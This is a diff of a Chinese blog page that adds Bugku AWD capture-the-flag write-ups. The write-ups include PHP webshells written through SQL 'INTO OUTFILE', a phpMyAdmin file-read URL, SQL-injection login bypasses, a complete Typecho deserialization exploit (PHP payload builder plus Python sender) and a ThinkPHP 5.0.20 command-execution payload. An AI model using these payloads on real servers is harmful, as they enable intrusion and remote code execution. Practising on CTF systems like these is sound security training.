@@ -874,14 +874,14 @@ ssh team32@192-168-1-255.bugku.awd.cn -p 2222这里的">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        874
+                        3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        12 分
                     </div>
                     
                 
@@ -945,6 +945,256 @@ find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</co
 <pre><code>find /var/www/html/ -name &quot;*.php&quot; | xargs grep &quot;system&quot;;</code></pre><p>来查找危险函数，然后根据找到的文件</p>
 <h2 id="SQL注入漏洞："><a href="#SQL注入漏洞：" class="headerlink" title="SQL注入漏洞："></a>SQL注入漏洞：</h2><p>首先你需要找到存在sql注入的点，由于一开始的时间不充足，可以采取将页面静态化的策略，直接修改from后面表的名字，这样对手就无法得到任何信息，在后续将大部分漏洞修补完毕以后再采取如下措施</p>
 <p>防御监控攻击tail -f *.log</p>
+<h1 id="Bugku-AWD-WP"><a href="#Bugku-AWD-WP" class="headerlink" title="Bugku-AWD-WP"></a>Bugku-AWD-WP</h1><h2 id="AWD复现-S1-1-WriteUp"><a href="#AWD复现-S1-1-WriteUp" class="headerlink" title="AWD复现-S1-1 WriteUp"></a>AWD复现-S1-1 WriteUp</h2><p>我的流程似乎和WP（<a href="https://ctf.bugku.com/writeup/detail/id/73.html）里使用php168cms全站RCE的漏洞不太一样，我只能概括为运气较好。" target="_blank" rel="noopener">https://ctf.bugku.com/writeup/detail/id/73.html）里使用php168cms全站RCE的漏洞不太一样，我只能概括为运气较好。</a></p>
+<p>进入后台，方法是（参考于）在网址后加”/admin/“</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//5dacf4b2469e44b5f5d0ad05e356f7c7.png" alt="img"></p>
+<p>用户名和密码都是简单猜解出来的，admin/123456，然后进入后台。</p>
+<p>然后点击如图所示的“服务器信息”，找到网站的根目录为”/var/www/html”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//531245e4a9130f7e86e6c28202174650.png" alt="img"></p>
+<p>然后点击“系统设置”—“数据库管理”。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//889e0726b6bef42bd8e8206478adf0d3.png" alt="img"></p>
+<p>这里我尝试执行show databases，但没有回显。</p>
+<p>于是我去执行了select “<?php @eval($_POST['jjy']);?>“ into outfile “/var/www/html/1.php”;，执行后可以访问文件，但连接shell的时候失败了。我以为是WAF识别了菜刀的通讯流量，换成了哥斯拉webshell继续，结果还是失败了。</p>
+<p>我最后一次是将”<?php system($_GET[shell]);?>“放到了根目录下的shell.php文件，然后就可以直接RCE了。如图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//b3c579c37f3ab61c0c3fa4893cd4eb21.png" alt="img"></p>
+<p>执行Liunx指令find / -name flag以查找flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//6be45c90a59b95db1b20166800e0b25d.png" alt="img"></p>
+<p>最后执行cat /flag获得flag</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//af8a661ff9be7542d333d609355595f7.png" alt="img"></p>
+<h2 id="Bugku-S1-AWD排位赛-1-writeup"><a href="#Bugku-S1-AWD排位赛-1-writeup" class="headerlink" title="Bugku S1 AWD排位赛-1 writeup"></a>Bugku S1 AWD排位赛-1 writeup</h2><hr>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/eea7913b8190f58dddef7606b15c0f84.png" alt="图片1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/1dd3d755dd68112dd896a0c1abaec449.png" alt="图片2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/66b8de19d93b019d2c7b2adc3e2d9ff5.png" alt="图片3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/a7f3535387b0989e33a6e86b2e0ea276.png" alt="图片4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/fb760ac3c0965262a984a4b2698b21e2.png" alt="图片5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/a5fb04279585016b82f6eabe431ca6ed.png" alt="图片6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/28b156299240caaa7d40a97abb2276d2.png" alt="图片7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/18e70c9208788c56848a093ab3799564.png" alt="图片8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/1b3f7cc803a8c35af3a4bf07f893f0e2.png" alt="图片9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/8039f3604354ec8ef16b3f11ed081e65.png" alt="图片10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/f5d5dd42e30b8e426c2843e97f9fd981.png" alt="图片11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/8ed58bdddedc6fc69692ad57b36bd647.png" alt="图片12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/3859bfea45739c0c36720c69e135b263.png" alt="图片13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/571ef849e687555c8736930bbc36017f.png" alt="图片14.png"></p>
+<p>除了cms自带的漏洞，官方还放进一个一句话。位置：/inc/shell.php，使用D盾扫描即可发现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210324/c01a4bcd76aacebad090d7f58b82bd57.png" alt="QQ截图20210324203950.png"></p>
+<h2 id="Bugku-AWD公测赛-1"><a href="#Bugku-AWD公测赛-1" class="headerlink" title="Bugku AWD公测赛-1"></a>Bugku AWD公测赛-1</h2><h3 id="1-phpmyadmin-Getshell"><a href="#1-phpmyadmin-Getshell" class="headerlink" title="1. phpmyadmin Getshell"></a>1. phpmyadmin Getshell</h3><p>这个是最基本的，也是被使用最多的漏洞，</p>
+<p>利用wp-config.php里面给到的密码</p>
+<pre><code>define(&#39;DB_USER&#39;, &#39;admin&#39;);define(&#39;DB_PASSWORD&#39;, &#39;211679491d0462e3&#39;);</code></pre><p>登录/phpmyadmin/index.php然后执行sql语句即可</p>
+<p>可以选择修改密码使得web服务崩掉或者用于维权:</p>
+<pre><code>set password for admin@localhost = password(&#39;a_strong_pass&#39;);</code></pre><p>也可以写shell</p>
+<pre><code>SELECT &quot;&lt;?php eval($_POST[p]);&quot; INTO OUTFILE &quot;/app/eval.php&quot;;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210128/a0cd910170d40bcd195296050857b9dd.png" alt="屏幕快照 2021-01-28 上午11.22.42.png"></p>
+<h3 id="2-phpmyadmin-任意文件读取"><a href="#2-phpmyadmin-任意文件读取" class="headerlink" title="2. phpmyadmin 任意文件读取"></a>2. phpmyadmin 任意文件读取</h3><p>登录后访问：``</p>
+<pre><code>/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../flag</code></pre><p><code></code>即可</p>
+<h3 id="3-wordpress-后台getshell"><a href="#3-wordpress-后台getshell" class="headerlink" title="3. wordpress 后台getshell"></a>3. wordpress 后台getshell</h3><p>admin的密码需要进行猜解</p>
+<p>网站的关于自己页面写道：李白,1998年11月11日 因此密码猜测是<code>lb19981111.</code></p>
+<pre><code>可用工具 https://www.bugku.com/mima/</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210128/d151328a83d4c1e25eaaaa66160cf0e4.png" alt="屏幕快照 2021-01-28 上午11.19.30.png"></p>
+<p>进去后台之后就为所欲为了</p>
+<p>可以编辑主题外观文件，也可以修改插件，也可以自己上传插件和主题</p>
+<p>也可以上传媒体，直接上传phpwebshell即可。</p>
+<h3 id="4-wordpress前台找回密码getshell-（环境问题无法使用）"><a href="#4-wordpress前台找回密码getshell-（环境问题无法使用）" class="headerlink" title="4. wordpress前台找回密码getshell （环境问题无法使用）"></a>4. wordpress前台找回密码getshell （环境问题无法使用）</h3><p>大家参考一下<a href="https://blog.csdn.net/weixin_45473613/article/details/108962034" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45473613/article/details/108962034</a> 这次因为环境的问题确实无法getshell</p>
+<h2 id="Bugku-AWD公测赛-2-writeup"><a href="#Bugku-AWD公测赛-2-writeup" class="headerlink" title="Bugku AWD公测赛-2 writeup"></a>Bugku AWD公测赛-2 writeup</h2><p>复现地址： <a href="http://81.70.197.140:8080/" target="_blank" rel="noopener">http://81.70.197.140:8080/</a></p>
+<p>本文由官方联合 <a href="https://ctf.bugku.com/team/detail/id/56.html" target="_blank" rel="noopener">自由公式</a>战队共同撰写</p>
+<p>首先登录ssh，脱一份源码下来。在</p>
+<p>/app/includes/other.fun.php可以看到这个cms的具体信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/1478338a037c92494492eab86f319a4f.png" alt="图片1.png"></p>
+<p>利用wooyun漏洞库查询历史漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/31f87162fdbc5c2cc9d8bd53b17cfe15.png" alt="图片2.png"></p>
+<p>在Seay源代码审计里面找到上传的文件有后缀限制没办法geshell，所以只能看第一个漏洞详情了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/39c4c54362023407ad212d189cfafcfb.png" alt="图片3.png"></p>
+<p>可以看到具体的SQL注入写webshell语句，于是改下写入路径exp：</p>
+<pre><code>username=admin&#39; and 1=2 UNION SELECT 0x3C3F70687020406576616C28245F504F53545B2741275D293B3F3E,2,3,4,5 into outfile &#39;/app/upload/bannerpic/t.php&#39;#&amp;password=a</code></pre><p>并且执行die(system(‘cat /flag’));输出flag</p>
+<p>下图为 <a href="https://ctf.bugku.com/team/detail/id/56.html" target="_blank" rel="noopener">自由公式</a>战队的批量getshell提交flag脚本</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/95d8a20f90fe6d20920d28629e4b7eb1.png" alt="图片4.png"></p>
+<p>另外后台存在万能密码登录漏洞</p>
+<p>用户名 admin’or’=’or’ 密码随意</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/89099082f8facb0d6c31d735859c4a23.png" alt="QQ20210201-135430@2x.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210201/5b5f00b7ceee8700be98bb762f7281b4.png" alt="QQ20210201-135539@2x.png"></p>
+<h2 id="Bugku-AWD公测赛-3-writeup"><a href="#Bugku-AWD公测赛-3-writeup" class="headerlink" title="Bugku AWD公测赛-3 writeup"></a>Bugku AWD公测赛-3 writeup</h2><p>复现地址： <a href="http://81.70.197.140:8081/" target="_blank" rel="noopener">http://81.70.197.140:8081/</a></p>
+<p>前台搜索rce</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210204/6cfb838a909ba5244e015daa6f2383c2.png" alt="vuln1.png"></p>
+<p>admin伪造+文件读取</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210204/eedd84c12ca234c55a93c6c24b099551.png" alt="vuln2.png"></p>
+<p>admin伪造+后台模版编辑getshell</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210204/24cfa031ffb0358d2cfd8b20899b2a3c.png" alt="vuln3.png"></p>
+<p>{if-h:eval($_POST[a])}{endif-h}</p>
+<p>内置模版后门</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210204/b5bc17c20c2b2d4794c0f77d11e67735.png" alt="vuln4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210204/f7010f7a8eb9d5700ce0b39eba3274a3.png" alt="vuln3.png"></p>
+<p>内置免杀D盾后门</p>
+<pre><code>Inc/config.php</code></pre><h2 id="Bugku-S1-AWD排位赛-2-writeup"><a href="#Bugku-S1-AWD排位赛-2-writeup" class="headerlink" title="Bugku S1 AWD排位赛-2 writeup"></a>Bugku S1 AWD排位赛-2 writeup</h2><h2 id="1-后台文件上传"><a href="#1-后台文件上传" class="headerlink" title="1.后台文件上传"></a>1.后台文件上传</h2><p>弱口令 admin/admin</p>
+<p>登陆后台，在上传后缀处加上php</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/6b1049c1b8b5a878c709f6d21b248dfc.jpg" alt="img"></p>
+<p>然后在上传logo处上传php文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/bcfe6b4b1923155af50f133b6dbda311.jpg" alt="img"></p>
+<p>直接回显了文件路径，访问即可执行phpinfo</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/5fc714314ddeecf3508b0946ebee3cdd.jpg" alt="img"></p>
+<h2 id="2-前台PHP教程处代码执行"><a href="#2-前台PHP教程处代码执行" class="headerlink" title="2.前台PHP教程处代码执行"></a>2.前台PHP教程处代码执行</h2><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/1abe6b917f23b430a7f3f3717e572c6e.png" alt="img"></p>
+<h2 id="3-重装漏洞"><a href="#3-重装漏洞" class="headerlink" title="3.重装漏洞"></a>3.重装漏洞</h2><p>安装时数据表前缀填写my_’,’hack’=&gt;phpinfo()];/*</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/36d47b087aaf2f926e2330eaf1de185b.png" alt="img"></p>
+<p>安装成功后访问如下链接</p>
+<p><a href="http://w3.io/app/database.php" target="_blank" rel="noopener">http://xxx.com/app/database.php</a></p>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210216/313761b7bf86c129e02414983bbbec35.png" alt="img"></p>
+<h2 id="Bugku-S1-AWD排位赛-3-writeup"><a href="#Bugku-S1-AWD排位赛-3-writeup" class="headerlink" title="Bugku S1 AWD排位赛-3 writeup"></a>Bugku S1 AWD排位赛-3 writeup</h2><p><strong>0x01</strong> <strong>typecho的install反序列漏洞</strong></p>
+<p>getshell payload 0x01 首先生成padyload</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span><span class="token operator">?</span>php
+
+<span class="token keyword">class</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">{</span>
+    <span class="token keyword">private</span> \$_type <span class="token operator">=</span> <span class="token string">'ATOM 1.0'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> \$_charset <span class="token operator">=</span> <span class="token string">'UTF-8'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> \$_lang <span class="token operator">=</span> <span class="token string">'zh'</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> \$_items <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">addItem</span><span class="token punctuation">(</span>array \$item<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        \$<span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>_items<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> \$item<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">class</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">{</span>
+    <span class="token keyword">private</span> \$_params <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'screenName'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'file_put_contents(\\'</span>luffy<span class="token punctuation">.</span>php\\<span class="token string">', \\'</span><span class="token operator">&lt;</span><span class="token operator">?</span>php @<span class="token function">eval</span><span class="token punctuation">(</span>\$_POST<span class="token punctuation">[</span>luffy<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">></span>\\<span class="token string">')'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> \$_filter <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'assert'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+\$payload1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+\$payload2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+\$payload1<span class="token operator">-</span><span class="token operator">></span><span class="token function">addItem</span><span class="token punctuation">(</span><span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'author'</span> <span class="token operator">=</span><span class="token operator">></span> \$payload2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+\$exp <span class="token operator">=</span> <span class="token function">array</span><span class="token punctuation">(</span><span class="token string">'adapter'</span> <span class="token operator">=</span><span class="token operator">></span> \$payload1<span class="token punctuation">,</span> <span class="token string">'prefix'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'typecho'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+echo <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span>\$exp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">?</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后填充内容到exp</p>
+<pre class="line-numbers language-javascript"><code class="language-javascript"># <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span> coding<span class="token punctuation">:</span>utf<span class="token number">-8</span> <span class="token operator">-</span><span class="token operator">*</span><span class="token operator">-</span>
+<span class="token keyword">import</span> requests<span class="token punctuation">,</span>re
+<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup <span class="token keyword">as</span> bs
+
+def <span class="token function">send</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    # exp <span class="token operator">=</span> <span class="token string">'YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NTp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIyOiIAVHlwZWNob19GZWVkAF92ZXJzaW9uIjtpOjE7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJlbiI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdwYXNzLnBocCcsICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NDoidGgxcyI7fQ==+JykiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6NjoiYXNzZXJ0Ijt9fX19fXM6NjoicHJlZml4IjtzOjQ6InRoMXMiO30'</span>
+    exp <span class="token operator">=</span> <span class="token string">"YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NjM6ImZpbGVfcHV0X2NvbnRlbnRzKCdsdWZmeS5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW2x1ZmZ5XSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ=="</span>
+    referer <span class="token operator">=</span> <span class="token string">"http://"</span><span class="token operator">+</span>url<span class="token operator">+</span><span class="token string">"/admin"</span>
+    cookies <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'__typecho_config'</span><span class="token punctuation">:</span>exp<span class="token punctuation">}</span>
+    params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"finish"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span>
+    headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8'</span><span class="token punctuation">,</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'</span><span class="token punctuation">,</span>
+        <span class="token string">'Referer'</span><span class="token punctuation">:</span> referer<span class="token punctuation">,</span>
+        <span class="token string">'Host'</span> <span class="token punctuation">:</span> url
+        <span class="token punctuation">}</span>
+    attack_url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"/install.php"</span>
+    exp_url <span class="token operator">=</span><span class="token string">"http://"</span> <span class="token operator">+</span> url <span class="token operator">+</span> <span class="token string">"/luffy.php"</span>
+    # <span class="token function">print</span><span class="token punctuation">(</span>attack_url<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        response <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>attack_url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>cookies<span class="token operator">=</span>cookies<span class="token punctuation">)</span>
+
+        response2 <span class="token operator">=</span> requests<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>exp_url<span class="token punctuation">,</span>params<span class="token operator">=</span>params<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+
+
+        <span class="token keyword">if</span> response2<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
+            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"wonderful! url is "</span><span class="token operator">+</span> exp_url <span class="token operator">+</span> <span class="token string">"\\n"</span><span class="token punctuation">)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"测试失败"</span><span class="token punctuation">)</span>
+    except Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token function">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"requests error"</span><span class="token punctuation">)</span>
+
+
+
+<span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://ctf.bugku.com/upload/writeup/20210416/bf4fae809fc963e041550c7a516615ea.png" alt="luffy.png"></p>
+<p><strong>漏洞链接</strong></p>
+<p><strong>0x02 thinkphp</strong></p>
+<p>thinkphp5.0.20命令执行漏洞</p>
+<p><strong>POST</strong></p>
+<pre class="line-numbers language-javascript"><code class="language-javascript">s<span class="token operator">=</span>whoami<span class="token operator">&amp;</span>_method<span class="token operator">=</span>__construct<span class="token operator">&amp;</span>method<span class="token operator">=</span>POST<span class="token operator">&amp;</span>filter<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>system
